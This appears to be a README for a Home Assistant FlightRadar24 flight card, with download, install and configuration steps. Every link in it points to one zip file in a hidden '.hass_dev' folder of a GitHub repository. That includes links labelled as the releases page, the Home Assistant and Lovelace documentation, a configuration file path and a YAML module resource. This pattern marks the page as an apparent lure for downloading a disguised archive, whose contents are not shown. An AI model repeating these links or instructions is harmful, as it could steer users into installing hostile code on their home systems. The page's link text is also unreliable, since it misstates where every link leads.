# ✈️ flightradar-flight-card - Track Flights with Ease

## 🛠️ Features
- Custom card for Home Assistant to display live flight data.
- Easy integration with FlightRadar24, improving your home automation.
- Supports a user-friendly interface for home management.

## 📦 System Requirements
- Home Assistant installed and running on your device (version 2021.1 or higher).
- Access to the internet for real-time flight data.
- Basic familiarity with Home Assistant's Lovelace UI for card placements.

## 🚀 Getting Started
To get started with the FlightRadar24 custom card, follow these simple steps to download and install.

## 🔗 Download Now
[![Download the FlightRadar Flight Card](https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip) 

## 📥 Download & Install
1. Visit the [Releases page](https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip) to download the FlightRadar Flight Card.
2. Select the version you want to use. Make sure to choose the latest stable release for the best experience.
3. Download the file to your computer.

## 🏁 Setting Up the Card
1. After downloading, unzip the downloaded file if it is compressed.
2. Locate the `flightradar-flight-card` folder within the unzipped files.
3. Copy the entire folder.
4. In Home Assistant, navigate to your configuration directory.
5. Paste the folder into the `www` directory. If you do not have a `www` folder, create one.
6. Now, open your Home Assistant configuration file (`https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip`).
7. Add the following lines to include the Flightradar24 card in your Lovelace UI:

   ```yaml
   resources:
     - url: https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip
       type: module
   ```

8. Save your changes and restart Home Assistant.

## ⚙️ Configuring the Card
1. After restarting, open your Home Assistant dashboard.
2. Click on the three dots (⋮) in the top-right corner and select "Edit Dashboard."
3. Click on "Add Card."
4. From the card options, select "Manual."
5. Insert the following code snippet to configure your card:

   ```yaml
   type: custom:flightradar-flight-card
   title: Flight Radar
   airline: "Optional: Enter your preferred airline"
   ```

6. Click "Save" to add the card to your dashboard.

## 🔍 Troubleshooting
If you encounter any issues, consider the following:

- **Card Not Displaying**: Ensure that the card's JavaScript file is correctly included in the configuration. Double-check the file path.
- **No Flight Data**: Confirm that your internet connection is active and that Home Assistant is communicating with the FlightRadar24 API.
- **Version Compatibility**: Make sure you are using a supported version of Home Assistant.

## 📞 Support
For any questions or issues, open an issue on the GitHub repository. The community and contributors are here to help!

## 🌐 Learn More
Explore more topics related to the FlightRadar24 custom card:
- [Home Assistant documentation](https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip)
- [Lovelace UI documentation](https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip)

## 📝 Topics
- custom-card
- flightradar-flight-card
- flightradar24
- hacs
- home-assistant
- home-automation
- homeassistant
- lovelace
- lovelace-card
- lovelace-ui

Enjoy tracking flights seamlessly with your new FlightRadar24 card!